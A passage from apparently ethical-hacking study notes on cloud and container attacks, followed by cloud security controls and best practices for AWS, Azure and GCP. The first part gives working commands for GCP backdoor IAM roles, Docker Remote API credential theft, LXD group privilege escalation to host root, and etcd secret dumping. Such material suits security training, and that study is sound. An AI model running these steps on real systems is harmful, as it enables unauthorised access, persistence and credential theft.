				- Run the following command to list all permissions assigned to each member within the targeted GCP project: python3 enumerate_member_permissions.py --project-id test-<project ID>
			- Scan for Privilege Escalation Vulnerabilities:
				- Using the enumerated permissions, run the following command to identify potential privilege escalation vulnerabilities: python3 check_for_privesc.py
			- Analyze the Results:
				- After the scan is completed, the attacker will obtain the following output files containing information about privilege escalation vulnerabilities in the GCP project:
					- all_org_folder_proj_sa_permissions.json – A list of all project members and their associated permissions.
					- privesc_methods.txt – A list of identified methods that can be used to escalate privileges within the GCP environment.
					- setIamPolicy_methods.txt – A list of methods that involve setting IAM policies, which can be exploited for privilege escalation.
		- Note: Having read and manage permissions specific to IAM resources is typically sufficient to perform this activity.
	- Escalating Privileges of Google Storage Buckets Using GCPBucketBrute (rhinosecuritylabs.com):
		- Similar to Amazon AWS S3 buckets, Google Cloud Storage (GCS) uses buckets for static file storage. Misconfigured bucket permission policies can expose these buckets to all GCP users or even to the public internet. Like AWS S3, Google Storage buckets are susceptible to privilege escalation attacks due to improperly configured Access Control Lists (ACLs).
		- GCPBucketBrute is a script-based tool that allows attackers to enumerate Google Storage buckets, determine their access levels, and assess whether privilege escalation is possible. This tool checks a bucket’s policy by making a direct HTTP request to: https://www.googleapis.com/storage/v1/b/BUCKETNAME/iam
		- If "allUsers" or "allAuthenticatedUsers" have read access to the bucket policy, the request returns a valid response; otherwise, an access denied message is displayed.
		- Additionally, attackers can leverage the Google Storage TestIamPermissions API by providing a bucket name and a list of Google Storage permissions to retrieve the bucket’s access levels.
		- GCPBucketBrute enables attackers to identify their privileges on discovered buckets. If they have any level of access, the tool displays a list of granted permissions. If the attackers possess enough privileges to escalate their access, the tool flags the bucket as vulnerable to privilege escalation. This allows attackers to elevate their permissions, potentially gaining administrative control over the bucket.
	- Maintaining Access: Creating Backdoors with IAM Roles in GCP:
		- Creating backdoors with IAM roles on Google Cloud Platform (GCP) involves setting up persistent access methods that allow an attacker to regain access, even if the initial entry point is detected and removed.
		- An attacker can follow the steps below to create a backdoor account in the targeted GCP environment and grant sufficient permissions to evade detection.
			- Creating New IAM Roles:
				- An attacker creates new roles with elevated permissions: gcloud iam roles create <ROLE_NAME> --project=<PROJECT_ID> --file=role-definition.yaml
				- This command creates a new role with elevated permissions as defined in role-definition.yaml.
			- Assigning Roles to Service Accounts:
				- Attaching roles to service accounts ensures they have the necessary permissions for future access: gcloud projects add-iam-policy-binding <PROJECT_ID> --member=serviceAccount:<SERVICE_ACCOUNT>@<PROJECT_ID>.iam.gserviceaccount.com --role=roles/<ROLE_NAME>
				- This command assigns the newly created role to a service account, ensuring it retains the necessary permissions for continued access.
				- By configuring these roles and permissions, attackers can establish a persistent backdoor in the GCP environment.
		- Note: These activities can only be performed after an attacker has escalated their privileges to an administrative level.
	- GCPGoat: A Vulnerable-by-Design GCP Infrastructure (github.com):
		- GCPGoat is a deliberately vulnerable GCP infrastructure designed to help security professionals and researchers test and enhance their attack skills by exploiting common misconfigurations and vulnerabilities. These include cross-site scripting (XSS), server-side request forgery (SSRF), weak storage bucket implementations, and IAM privilege escalation. By emulating real-world cloud environments, GCPGoat highlights the latest OWASP Top 10 web application security risks (2021) and other common misconfigurations in services such as IAM, storage buckets, Cloud Functions, and Compute Engine.
		- The following are various attack scenarios where GCPGoat can be used for practice:
			- Server-Side Request Forgery (SSRF): Exploit an SSRF vulnerability to retrieve source code from a Cloud Function, dump the database, and escalate privileges to compromise the admin account of a target blog application.
			- Misconfigured Storage Bucket Policies: Leverage improperly configured storage bucket policies to gain unauthorized administrative access to a cloud storage bucket.
			- Lateral Movement: Extract credentials for a low-privileged virtual machine instance from a development storage bucket, then use them to escalate access to higher-privileged Compute Engine instances.
- Container Hacking:
	- Information Gathering Using kubectl:
		- Attackers can gather information to identify weaknesses in containerized environments. To do this, they often use kubectl, a command-line tool for interacting with Kubernetes clusters. By leveraging kubectl, attackers can retrieve crucial details about the cluster and its components, aiding further exploitation.
		- Below are various kubectl commands used for information gathering:
			- List all pods in the Kubernetes cluster: kubectl get pods
			- Fetch detailed information about a specific pod: kubectl describe pod <pod-name>
			- Dump logs of a specific pod: kubectl logs <pod-name>
			- Display all services running in the cluster: kubectl get services
			- Retrieve detailed information about services: kubectl describe services
			- List all deployments in the cluster: kubectl get deployments
			- Get detailed information about a specific deployment: kubectl describe deployment <deployment-name>
			- List all service accounts in the cluster: kubectl get serviceaccounts
			- Retrieve detailed information about service accounts: kubectl describe serviceaccount <serviceaccount-name>
		- Using these commands, attackers can gather critical insights into a containerized environment, potentially uncovering vulnerabilities that can be exploited.
	- Enumerating Registries:
		- Enumerating container registries can provide valuable insights into containerized environments. Attackers may perform registry enumeration to identify outdated images or misconfigured containers with known vulnerabilities. This process also allows them to gather critical information, such as environment variables, network configurations, and metadata stored within image layers, which can be leveraged for further exploitation. Once a registry is discovered, attackers may attempt to download or tamper with stored images.
		- Below are various commands used to enumerate registries:
			- Log in to a registry: docker login <registry-url>
			- List repositories for a user or organization: curl -s https://hub.docker.com/v2/repositories/<username>/
			- List images in a specified Docker registry (using the registry API): curl -u <username>:<password> https://<registry-url>/v2/_catalog
			- List tags for an image in a registry: curl -u <username>:<password> https://<registry-url>/v2/<image-name>/tags/list
	- Container/Kubernetes Vulnerability Scanning:
		- Container images consist of an operating system, application, runtime, and other components packaged together. These containers are widely reused and may include open-source frameworks with known vulnerabilities. Such vulnerabilities can compromise not only individual containers but also the entire container runtime environment. Attackers use various tools, such as Trivy, Anchore, Clair, Dagda, and Snyk, to scan and identify security weaknesses in containers.
		- Trivy (github.com):
			- Trivy is an automated tool used for container image vulnerability scanning. Users need to specify the image name to initiate an accurate scan. Trivy detects vulnerabilities in OS packages (e.g., Alpine, RHEL, CentOS) and application dependencies (e.g., Bundler, Composer, npm, Yarn).
			- Usage: trivy <target> [--scanners <scanner1,scanner2>] <subject>
		- Sysdig (github.com):
			- Sysdig identifies Kubernetes vulnerabilities by integrating with continuous integration (CI) and continuous delivery/deployment (CD) pipelines, image registries, and Kubernetes admission controllers. It also validates container images at the orchestration level using Kubernetes admission controller features. Sysdig automatically generates an inventory of image contents and continuously monitors for new vulnerabilities or common vulnerabilities and exposures (CVEs) associated with containers.
		- Kubescape (github.com)
		- Kube-hunter (github.com)
		- Kubeaudit (github.com)
		- KubiScan (github.com)
		- Krane (github.com)
	- Exploiting Docker Remote API:
		- After gaining access to a target Docker host, attackers can exploit the Docker Remote API to launch further attacks. These may include cryptocurrency mining, masking IPs to initiate attacks, creating botnets for DoS attacks, installing phishing services, retrieving sensitive data (e.g., credentials), and compromising the internal network's security.
		- Retrieving Files from the Docker Host:
			- Attackers can create a new container and mount it to a folder on the Docker host to gain access to additional files.
			- To pull an Alpine Linux image, run: $ docker -H <Remote IP:Port> pull alpine
			- Next, create a container from the image: $ docker -H <Remote IP:Port> run -t -d alpine
			- After creating the container, run the following command to list files stored on the Docker host: $ docker -H <Remote IP:Port> exec modest_goldstine ls
			- Similarly, attackers can mount the host’s /etc directory to a container to retrieve contents such as the /etc/hosts file. Accessing this file allows attackers to modify host entries for malicious purposes.
			- Additionally, attackers can access data stored outside the host by identifying mounted volumes within the container. The docker inspect command can detect external storage mounts such as Amazon S3 or Network File System (NFS). If a mount has write access, attackers can manipulate stored files.
		- Scanning the Internal Network:
			- If an attacker creates a container within an existing Docker network bridge, they gain access to all hosts reachable by the primary Docker host.
			- To scan the internal network and identify running services using Nmap, execute: $ docker -H <docker host> run --network=host --rm marsmensch/nmap -ox <IP Range>
		- Retrieving Credentials:
			- Environment variables are commonly used in Docker to pass credentials as arguments when running containers. Attackers can use the docker inspect command to find environment variables stored on the Docker host. Running the env command inside a container reveals details, including credentials used during container initialization.
			- Commands to retrieve credentials:
				$ docker -H [docker remote host] inspect [container name]
				$ docker -H [docker remote host] exec -i [container name] env
		- Querying Databases:
			- After obtaining credentials, attackers can query MySQL containers to extract sensitive database information.
			- To find MySQL containers on the target Docker host: $ docker -H [docker remote host] ps | grep mysql
			- To retrieve MySQL credentials: $ docker -H [docker remote host] exec -i some-mysql env
			- Using the retrieved credentials, attackers can list databases inside the MySQL container: $ docker -H [docker host] exec -i some-mysql mysql -u root -p<password> -e "SHOW DATABASES;"
		- Note: These activities can only be performed after attackers have escalated their privileges to an administrative level.
	- Hacking Container Volumes:
		- In Kubernetes, containers use volumes to share filesystems and manipulate container files. A volume functions like a directory that stores files and is accessible to all containers within a pod. Kubernetes supports various types of volumes, such as NFS (Network File System) and iSCSI (Internet Small Computer Systems Interface), using different protocols. Weak or default configurations in these volumes can be exploited by attackers to escalate privileges and move laterally within the internal network.
		- Accessing Master Nodes:
			- Volume configurations, such as iSCSI, store configuration details as secrets. If attackers gain access to the Kubernetes API or etcd, they can retrieve these configuration details, compromising the security of the volumes.
		- Accessing Nodes:
			- Kubelet manages pods, meaning that if attackers gain access to a node within a pod, they can access all volumes used by that pod. Additionally, attackers can use filesystem tools to view logs and gather useful information about the node. For example, using the df command, attackers can retrieve configuration details of volumes utilizing NFS.
		- Accessing Containers:
			- Similar to accessing nodes, attackers can obtain the same information from within a container. By exploiting volumes from a compromised container, attackers can configure the hostPath volume type to extract sensitive data from the node. They can also use filesystem tools to browse all mounted volumes.
		- Note: Attackers can only perform these activities after escalating their privileges to an administrative level.
	- LXD/LXC Container Group Privilege Escalation:
		- LXD is a system container manager, while LXC is its underlying container runtime. They are commonly used to run full Linux distributions within containers. If a user is part of the lxd group on a system, they can exploit this membership to escalate their privileges to root. This is because members of the lxd group have significant control over container creation and management, which can be leveraged to gain access to the host system.
		- Steps to Perform LXD/LXC Group Privilege Escalation:
			- Follow these steps to execute privilege escalation using LXD/LXC:
			- Verify LXD Group Membership:
				- Before proceeding, check if you are a member of the lxd group using: id
				- If your user is part of the lxd group, you can proceed with the escalation steps.
			- Install Required Tools:
				- Ensure you have distrobuilder installed, as it is necessary for building custom Linux distribution images for LXD/LXC containers.
			- Create an Alpine Linux Image:
				- Run the following commands to set up and create an Alpine Linux image:
					mkdir -p $HOME/ContainerImages/alpine/
					cd $HOME/ContainerImages/alpine/
					wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
				- Now, build the Alpine image: sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
			- Import the Alpine Image into LXD:
				- After preparing the Alpine Linux image, import it into LXD: lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
				- Note: lxd.tar.xz and rootfs.squashfs are example filenames and may vary based on the generated files.
			- Verify the Image in LXD:
				- Check if the image has been successfully added: lxc image list
			- Create and Configure a Privileged Container:
				- Create a new container and enable privileged mode: lxc init alpine privesc -c security.privileged=true
				- Verify the container list: lxc list
				- Next, add the host’s root filesystem as a mount inside the container: lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
			- Start the Container and Gain Root Access:
				- Execute the container and gain root access to the host system:
					lxc start privesc
					lxc exec privesc /bin/sh
				- At this point, you should have root access to the host system via the privileged container.
	- Post-Enumeration on Kubernetes etcd:
		- Kubernetes is a distributed computing platform that requires a distributed database, such as etcd. etcd is a consistent, distributed key-value store where Kubernetes cluster data, service discovery details, API objects, and other critical information are stored. The API server communicates with etcd to retrieve and store information based on requests from other Kubernetes components. Gaining access to etcd is equivalent to obtaining root-level access to the system.
		- In Kubernetes, only the API server is allowed to access the etcd store. However, attackers may attempt to enumerate etcd processes, configuration files, and open ports (particularly port 2379) to identify endpoints connected to the Kubernetes environment.
		- For example, attackers can use the following command to enumerate the location of the etcd server and PKI information: ps -ef | grep apiserver
		- Attackers may also enumerate metadata services provided by cloud providers to identify the etcd server's location and retrieve critical information such as certificates and key files. After gathering information about the etcd server and PKI, attackers can browse registries to extract cluster data.
		- For example, they can run the following command to enumerate secrets stored in the Kubernetes cluster:
			ETCDCTL_API=3 ./etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt \
			  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
			  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
			  --endpoints=https://127.0.0.1:2379 get /registry/ --prefix | grep -a '/registry/secrets/'
		- Additionally, attackers can retrieve a specific key and convert it into YAML format using:
			ETCDCTL_API=3 ./etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt \
			  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
			  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
			  --endpoints=https://127.0.0.1:2379 get /registry/secrets/kube-system/weave-net-token-nmb26 \
			  | ./auger decode -o yaml
		- By decoding keys, attackers can extract endpoint details from the kubeconfig file. They can leverage this information to escalate privileges and gain access to node-level resources.
		- Note: Attackers can perform these actions only after escalating their privileges to an administrative level.
- Cloud Security:
	- There are various risks and threats associated with cloud service adoption and the migration of business-critical data to third-party systems. However, following security guidelines and implementing countermeasures can strengthen the business case for cloud adoption. This section covers various cloud security standards, countermeasures, and best practices to protect data hosted in cloud environments.
	- Cloud Security Control Layers:
		- The following layers illustrate how the cloud model maps to the security control model:
		- Application Layer:
			- To secure the application layer, establish policies that align with industry security standards, such as OWASP for web applications. These policies should comply with relevant regulatory and business requirements.
			- Application layer security controls include:
				- Secure software development lifecycle (SDLC)
				- Binary analysis
				- Security scanners
				- Web application firewalls (WAF)
				- Transactional security
			- Information Layer:
				- Develop and document an information security management program that includes administrative, technical, and physical safeguards to protect data from unauthorized access, modification, or deletion.
				- Information layer security controls include:
					- Data loss prevention (DLP)
					- Content monitoring and filtering
					- Database activity monitoring
					- Encryption
			- Management Layer:
				- This layer addresses cloud security administration to ensure continuous and effective cloud services. Cloud consumers should evaluate service providers based on their security policies.
				- Management layer security controls include:
					- Governance, risk, and compliance (GRC)
					- Identity and access management (IAM)
					- Vulnerability assessment and management (VA/VM)
					- Patch management
					- Configuration management
					- Continuous monitoring
			- Network Layer:
				- This layer involves security measures and policies adopted by network administrators to monitor and prevent unauthorized access, misuse, modification, or denial of network-accessible resources.
				- Network layer security controls include:
					- Network intrusion prevention/detection systems (IPS/IDS)
					- Firewalls
					- Deep packet inspection (DPI)
					- Anti-DDoS measures
					- Quality of service (QoS) enforcement
					- DNS Security Extensions (DNSSEC)
					- OAuth for authentication and authorization
			- Trusted Computing:
				- Trusted computing ensures a secure computational environment by implementing internal controls, auditability, and maintenance to guarantee the availability and integrity of cloud operations.
				- Security controls in this category include:
					- Hardware and software Root of Trust (RoT)
					- Secure API implementation
			- Computation and Storage:
				- In the cloud, due to the lack of direct physical control over data and infrastructure, service providers must establish policies and procedures for secure data storage, retention, and computation. They must implement robust backup mechanisms to ensure service availability and continuity while complying with statutory, regulatory, contractual, and business requirements.
				- Computation and storage security controls include:
					- Host-based firewalls
					- Host-based intrusion detection/prevention systems (HIDS/HIPS)
					- Integrity monitoring and file/log management
					- Encryption and data masking
			- Physical Layer:
				- This layer encompasses security measures for cloud infrastructure, data centers, and physical resources.
				- Physical security controls include:
					- Secure facility design (fences, walls, and barriers)
					- Physical access controls (gates, guards, and security patrols)
					- Electronic surveillance (CCTV and motion sensors)
					- Biometric authentication mechanisms
	- Cloud Security: A Shared Responsibility Between Cloud Providers and Consumers:
		- Security in cloud environments is a shared responsibility between cloud service providers (CSPs) and cloud consumers, with each party having varying levels of control over computing resources. Unlike traditional IT systems, where a single organization manages the entire computing stack and system lifecycle, cloud-based systems require collaboration between CSPs and consumers in designing, building, deploying, and operating secure infrastructures.
		- The level of responsibility depends on the cloud service model used (IaaS, PaaS, or SaaS), with different degrees of control distributed between CSPs and consumers.
		- Example: In an IaaS model, the cloud provider typically manages the initial system's privileged user accounts, while the cloud consumer is responsible for managing user accounts within deployed applications.
		- Key Cloud Security Controls:
			- PKI: Public Key Infrastructure
			- SDL: Security Development Lifecycle
			- WAF: Web Application Firewall
			- FW: Firewall
			- RTG: Real Traffic Grabber
			- IAM: Identity and Access Management
			- ENC: Encryption
			- DLP: Data Loss Prevention
			- IPS: Intrusion Prevention System
			- SWG: Secure Web Gateway
			- VA/VM: Vulnerability Assessment / Virtual Machine
			- App Sec: Application Security
			- AV: Antivirus
			- VPN: Virtual Private Network
			- LB: Load Balancer
			- GRC: Governance, Risk, and Compliance
			- Config Control: Configuration Control
			- CoS/QoS: Class of Service / Quality of Service
			- DDoS: Distributed Denial of Service Protection
			- TPM: Trusted Platform Module
			- NetFlow: Network Traffic Monitoring Protocol (by Cisco)
		- This shared responsibility model ensures that cloud-based systems maintain strong security postures, mitigating risks and enhancing data protection.
	- Cloud Computing Security Considerations:
		- Cloud computing services should be customized by vendors to meet clients' specific security requirements.
		- Cloud Service Providers (CSPs) should support high multi-tenancy to optimize cloud resource utilization while ensuring data and application security.
		- Cloud services must implement a disaster recovery plan to enable data retrieval in case of unexpected incidents.
		- Continuous monitoring of Quality of Service (QoS) is required to maintain service-level agreements (SLAs) between consumers and service providers.
		- Data stored in cloud services must be secured to ensure integrity and prevent unauthorized access.
		- Cloud computing services should be fast, reliable, and capable of providing quick response times to new requests.
		- Both symmetric and asymmetric cryptographic algorithms must be implemented to ensure optimal data security in cloud environments.
		- Cloud-based services should be securely engineered, operated, and integrated into the organization's security management framework.
		- Load balancing should be incorporated into cloud services to optimize network and resource utilization, improving response times and maximizing throughput.
		- CSPs must enhance resiliency and implement robust protections against physical threats.
		- Public cloud services should leverage advanced networking options, such as carrier-grade networks and dedicated VPNs, for enhanced security.
		- CSPs must implement appropriate incident handling and response plans.
		- CSPs should enforce role-based security measures, including role assignment, role authorization, and transaction authorization.
		- Cloud services should integrate global threat intelligence databases to improve security awareness and proactive threat mitigation.
		- Cloud providers should incorporate Cloud Access Security Broker (CASB) solutions to enable secure web gateways with Data Loss Prevention (DLP) capabilities.
		- Organizations should apply Zero Trust principles to segment business applications and enforce strict security controls.
		- CSPs must implement strict Identity and Access Management (IAM) policies to regulate access to cloud resources.
		- Cloud services should utilize Role-Based Access Control (RBAC) and enforce the principle of least privilege through well-defined policies.
		- Cloud services must comply with relevant regulations and industry standards to ensure legal and operational security.
		- CSPs should regularly test backup and disaster recovery procedures to validate their effectiveness and readiness.
	- Placement of Security Controls in the Cloud:
		- Implementing security controls in the cloud should be done strategically, ensuring they align with the level of risk. This is typically achieved by assessing threats, vulnerabilities, and potential impacts. To maintain an effective cloud security architecture, it is essential to implement appropriate defensive measures. A variety of security controls exist that, when properly placed, can mitigate system vulnerabilities and reduce the impact of attacks.
		- Categories of Security Controls:
			- Deterrent Controls:
				- These controls discourage attacks on the cloud system.
				- Example: A warning sign on a fence or property that informs potential attackers of consequences if they proceed.
			- Preventive Controls:
				- These controls strengthen the system against security incidents by minimizing or eliminating vulnerabilities.
				- Example: A strong authentication mechanism that prevents unauthorized access to cloud systems.
			- Detective Controls:
				- These controls identify and respond to security incidents in real time.
				- Example: Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) that monitor and detect attacks on cloud environments.
			- Corrective Controls:
				- These controls mitigate the consequences of security incidents by limiting damage and restoring systems.
				- Example: Restoring system backups after an incident to recover lost data.
	- Assessing Cloud Security Using Scout Suite:
		- Attack surface discovery involves identifying all potential entry points that an attacker could exploit to gain unauthorized access to a cloud network or virtual environment. This process includes asset identification, vulnerability assessment, access control review, network mapping, penetration testing, compliance checks, and threat analysis. Security professionals can use tools like Scout Suite to identify potential attack surfaces in their cloud environments.
		- Scout Suite (github.com):
			- Scout Suite is a multi-cloud security auditing tool that helps security professionals assess the security posture of cloud environments. It leverages APIs exposed by cloud providers to collect configuration data for both manual inspection and automated risk identification. Instead of navigating through multiple pages on cloud provider consoles, Scout Suite provides a clear and concise view of the attack surface.
			- Example Commands for Attack Surface Discovery Using Scout Suite:
				- AWS: Run the following command to assess the security posture of an AWS environment:
					- scout aws --profile <your-aws-profile>
					- This command scans and analyzes AWS cloud resources for security vulnerabilities.
				- Azure: Use the command below to scan an Azure environment:
					- scout azure --tenant-id <your-tenant-id> --subscription-id <your-subscription-id> --client-id <your-client-id> --client-secret <your-client-secret>
				- Google Cloud Platform (GCP): Execute the following command to assess a GCP environment:
					- scout gcp --service-account-file path/to/your-service-account-key.json
			- Scout Suite Reporting and Risk Analysis:
				- After the scan is completed, Scout Suite generates a detailed HTML report containing findings and cloud account configuration details.
				- It represents risk ratings using different colors, making it easier to prioritize security issues.
		- By integrating Scout Suite into your security assessment process, you can enhance visibility into your cloud infrastructure and proactively address potential vulnerabilities.
	- Best Practices for Securing the Cloud:
		- To ensure a secure cloud environment, implement the following best practices:
		- Data Protection & Compliance:
			- Enforce data protection, backup, retention, and secure deletion policies.
			- Implement strong encryption, key management, and secure authentication.
			- Ensure compliance with industry security standards and legal policies.
			- Conduct regular audits (e.g., AICPA SSAE 18 Type II) and penetration tests.
			- Apply consistent security frameworks for identity and access management.
			- Implement a cloud access security broker (CASB) for enhanced security controls.
		- Access & Authentication Controls:
			- Prohibit credential sharing among users, applications, and services.
			- Enforce multi-factor authentication (MFA) and strong password policies.
			- Implement secure authentication, authorization, and auditing controls.
			- Apply stringent registration, validation, and access control policies.
		- Infrastructure & Network Security:
			- Ensure isolated memory, storage, and network access.
			- Use VPNs, SSL encryption, and secure APIs to protect data transmission.
			- Monitor and log customer network traffic for anomalies.
			- Deploy security devices like IDS, IPS, and firewalls to prevent unauthorized access.
			- Regularly update and patch systems to mitigate vulnerabilities.
		- Monitoring & Threat Detection:
			- Employ AI/ML for automated threat detection and response.
			- Use user behavior analytics to detect and mitigate data loss threats.
			- Monitor client traffic for malicious activities and analyze API security.
			- Implement endpoint security and anti-malware solutions for IaaS/PaaS.
		- Cloud Provider Security & Transparency:
			- Assess cloud provider security policies, SLAs, and compliance measures.
			- Ensure clarity on data deletion policies and infrastructure security practices.
			- Disclose relevant security logs, patching details, and firewall configurations to customers.
			- Understand SLA terms, including uptime guarantees and penalties for non-compliance.
		- Governance & Risk Management:
			- Enforce strict supply chain security and comprehensive vendor assessments.
			- Perform vulnerability and configuration risk assessments regularly.
			- Establish consistent onboarding, configuration, and recovery processes.
			- Define a baseline security breach notification process.
			- Evaluate organizational risk tolerance to build minimally invasive policies.
	- Best Practices for Securing AWS Cloud:
		- The following are some best practices for securing AWS cloud environments:
		- Basic AWS Security Practices:
			- Categorize user identities based on accounts, roles, and groups to manage permissions for resource allocation.
			- Utilize temporary credentials to minimize risks associated with access key misuse.
			- Implement policies for the regular rotation of access keys, passwords, and other credentials.
			- Enforce the principle of least privilege for AWS resources.
			- Use AWS Trusted Advisor to detect and remediate security misconfigurations.
			- Establish clear and accessible AWS security policies.
			- Segregate AWS assets, including resources and user data, to enhance security.
			- Leverage AWS Service Quotas to manage resource limits and prevent overprovisioning or abuse.
			- Integrate security management systems based on organizational requirements.
			- Securely delete unused data and decommission inactive AWS groups.
			- Use IAM Access Analyzer to audit user permissions and policies.
			- Utilize AWS Git projects such as git-secrets, AWS Step Functions, and AWS Lambda to prevent unauthorized access.
			- Enable multi-factor authentication (MFA) for all AWS accounts to add an extra layer of security.
			- Keep all systems and applications updated with the latest security patches.
		- AWS Infrastructure Security Practices:
			- Implement an Information Security Management System (ISMS) to regularly assess security policies and controls.
			- Perform network segmentation and establish security zones for better management.
			- Deploy load balancers, content delivery networks (CDNs), and web application firewalls (WAFs) to protect against DoS, DDoS, XSS, and SQL injection attacks.
			- Customize AWS Security Hub insights to monitor and manage security issues.
			- Enforce a unified data loss prevention policy.
			- Conduct automated security assessments with Amazon Inspector to identify vulnerabilities.
		- AWS Financial Services Security Practices:
			- Use end-to-end encryption and Transparent Data Encryption (TDE) to secure communications with third parties.
			- Perform penetration testing on AWS services, including EC2 instances, NAT gateways, Elastic Load Balancers, RDS, and Aurora.
			- Utilize AWS CloudTrail and CloudWatch for auditing and monitoring AWS resources.
			- Manage multiple AWS accounts centrally using AWS Organizations and enforce governance with service control policies (SCPs).
		- AWS Security Hub Practices:
			- Use AWS Labs scripts to enable Security Hub across all AWS accounts.
			- Implement threat detection systems such as Amazon GuardDuty and Amazon Inspector.
			- Enable AWS Config and CIS Foundations standards for all AWS accounts and regions.
			- Assign tags to Security Hub resources to manage access controls efficiently.
			- Establish IAM policies for different user roles and centralize IAM governance through Cloud Infrastructure Entitlement Management (CIEM).
			- Build custom actions to extract and remediate Security Hub findings for both internal and external resources.
			- Use IAM roles instead of IAM users to grant applications and services access to AWS resources.
			- Employ IAM Access Analyzer to identify externally shared resources and ensure their security.
		- AWS Security Groups Practices:
			- Assign policies to groups rather than individual users for easier resource management.
			- Enable AWS VPC Flow Logs to monitor IP traffic and detect attack patterns or malicious activities within the VPC.
			- Use Amazon VPCs to isolate resources and enforce security controls with security groups and network ACLs.
			- Apply strict security group rules and network ACLs to regulate inbound and outbound traffic.
			- Automate email alerts for critical security notifications.
		- AWS Backup and Data Protection Practices:
			- Automate and schedule frequent backups.
			- Protect backups using immutable storage.
			- Integrate backup processes into disaster recovery, business continuity, and incident response plans.
			- Implement configuration audits, monitoring, and alerting systems.
			- Enable and monitor logs from AWS services such as VPC Flow Logs, S3 access logs, and CloudFront logs.
			- Regularly test data recovery capabilities.
	- Best Practices for Securing Microsoft Azure:
		- Below are various best practices for securing a Microsoft Azure environment:
		- Establish identity as the primary security perimeter in Azure environments.
		- Maintain visibility of users connected to the network via Azure ExpressRoute or a site-to-site VPN.
		- Utilize Azure Network Watcher to diagnose common VPN connection and gateway issues.
		- Implement a single sign-on (SSO) policy for seamless and secure authentication.
		- Enable multi-factor authentication (MFA) with a conditional access policy.
		- Automate access decisions using conditional access for subscribers.
		- Use Azure Role-Based Access Control (Azure RBAC) and Privileged Identity Management (PIM) to monitor and control resource access.
		- Limit the management group hierarchy to three levels to prevent confusion between operational and security decisions.
		- Enforce at least two emergency access accounts to restrict privileged resource access.
		- Leverage Microsoft security services such as Microsoft Defender for Cloud, Microsoft Defender for Cloud Apps, and Microsoft Sentinel for threat detection and prevention.
		- Deploy Microsoft Azure Security Center for real-time threat protection, Common Vulnerabilities and Exposures (CVE) scanning, and Microsoft Defender for Endpoint licensing.
		- Enable threat detection for Azure SQL databases.
		- Use cloud-based Security Information and Event Management (SIEM) solutions and integrate Defender for Cloud alerts.
		- Utilize Shared Access Signatures (SAS) to control and limit client data access.
		- Restrict access to administrative ports such as SSH, RDP, and WinRM.
		- Implement Just-In-Time (JIT) VM access to grant temporary permissions for privileged tasks while preventing unauthorized resource usage.
		- Enforce strong operational security policies across the environment.
		- Automate application and service deployment to enhance security and efficiency.
		- Verify application and service performance before deployment.
		- Enable password hash synchronization for secure authentication.
		- Disable legacy authentication protocols to reduce vulnerabilities.
		- Regularly review security changes to ensure continuous improvement.
		- Conduct frequent audits of IAM policies to enforce the principle of least privilege and remove unnecessary access.
		- Use Azure encryption services such as Azure Disk Encryption and Azure Key Vault to encrypt data at rest and in transit.
		- Deploy Azure Firewall for network protection and centralized control over application and network connectivity policies.
		- Protect APIs using Azure API Management and OAuth 2.0 to securely control and monitor API access.
		- Enable Azure DDoS Protection to safeguard applications against distributed denial-of-service (DDoS) attacks.
		- Manage virtual machines using Azure Bastion for secure RDP and SSH connections.
	- Best Practices for Securing Google Cloud Platform:
		- Below are various best practices for securing the Google Cloud Platform (GCP):
		- Implement STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege) as a threat model for protecting against threats in Google Cloud.
		- Leverage Key Management Services (KMS) and Customer-Supplied Encryption Keys (CSEK) to encrypt and manage data.
		- Implement application-layer encryption on Google Kubernetes Engine (GKE) services.
		- Enable encryption for GKE cluster nodes using customer-managed keys, and control access through specific IP addresses using HTTPS.
		- Enforce SSL encryption for Cloud SQL databases.
		- Disable support for the interactive serial console in Google VMs.
		- Use Terraform modules from private Git repositories to automatically provision resources.
		- Implement Shielded VMs to protect against rootkits, remote attacks, and privilege escalation.
		- Use a sandbox environment to analyze security threats.
		- Scan container images stored in the Container Registry for common vulnerabilities.
		- Enable Single Sign-On (SSO) for user authentication.
		- Create well-defined groups and assign roles using consistent naming conventions instead of assigning permissions to individual users.
		- Use a dedicated secure channel to connect on-premises networks to Google Cloud.
		- Enforce tag-based firewall rules to monitor and secure network traffic.
		- Use the Cloud Logging API to ingest, aggregate, and process logs.
		- Utilize Google Security Command Center Enterprise to aggregate and manage security findings, detecting and alerting misconfigurations, vulnerabilities, and threats.
		- Maintain visibility over storage volumes and resources across multiple projects.
		- Enforce strong password policies and multi-factor authentication (MFA) in both cloud and corporate environments.
		- Continuously monitor Admin Activity Logs to track GCP resource access.
		- Use IAM frameworks to control access to Google Cloud resources.
		- Disable public access to cloud storage buckets in organizational GCP accounts.
		- Enforce data retention policies for Google Cloud Storage.
		- Enable Private Google Access to allow VMs in VPC networks to access Google APIs and services without using public IP addresses.
	- NIST Recommendations for Cloud Security (www.nist.gov):
		- Below are NIST Recommendations for Cloud Security:
			- Assess the risks to the client’s data, software, and infrastructure.
			- Select an appropriate deployment model based on organizational needs.
			- Ensure that audit procedures are in place for data protection and software isolation.
			- Review and renew SLAs if security gaps exist between the organization’s security requirements and the cloud provider’s standards.
			- Establish effective incident detection and reporting mechanisms.
			- Analyze the organization's security objectives.
			- Determine who is responsible for data privacy and security in the cloud.
			- Implement robust antivirus software and firewalls to filter out unusual traffic.
			- Encrypt data both at rest and in transit.
		- In addition to these general recommendations, the National Institute of Standards and Technology (NIST) provides detailed guidelines on mandatory access control as part of its cybersecurity framework. These guidelines help organizations implement effective access control measures to safeguard their information systems and data.
		- The following tables outline access control recommendations for common cloud service models: Infrastructure as a Service (IaaS), Platform as a Service (PaaS), and Software as a Service (SaaS).
	- Security Assertion Markup Language (SAML):
